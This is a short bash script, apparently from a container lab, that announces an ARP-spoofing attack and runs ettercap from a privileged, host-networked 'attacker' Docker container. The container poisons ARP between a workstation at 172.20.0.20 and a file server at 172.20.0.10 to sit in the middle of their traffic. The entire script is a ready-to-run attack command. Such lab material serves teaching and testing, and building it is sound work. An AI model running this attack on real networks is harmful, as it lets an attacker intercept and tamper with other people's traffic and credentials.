#!/bin/bash
echo "[ATTACK] Starting ARP spoofing..."
echo "[TARGET] Workstation: 172.20.0.20"
echo "[TARGET] File-server: 172.20.0.10" 


# Start ettercap with host networking, and --privileged for full access.
docker run --rm -it --privileged --network=host attacker \
ettercap -T -M arp:remote /172.20.0.20// /172.20.0.10// --mitm
